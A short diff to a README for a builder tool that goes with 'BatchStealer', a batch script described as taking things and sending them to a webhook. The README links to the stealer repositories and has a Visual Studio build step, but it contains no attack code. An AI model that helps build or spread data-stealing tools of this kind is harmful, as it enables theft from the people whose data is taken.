@@ -1,7 +1,6 @@
 # Automatic Builder | [BatchStealer](https://github.com/Takaovi/BatchStealer) | [BatchStealer Example](https://github.com/Takaovi/BatchStealer-Example)
 
-### 📜 A batch script for taking things and sending them to a webhook 
-
+### 📜 Batch Stealer builder/editor
 # How to use
 
 * Install [Visual Studio](https://visualstudio.microsoft.com/vs/community/) (I used 2019 version) and build the program
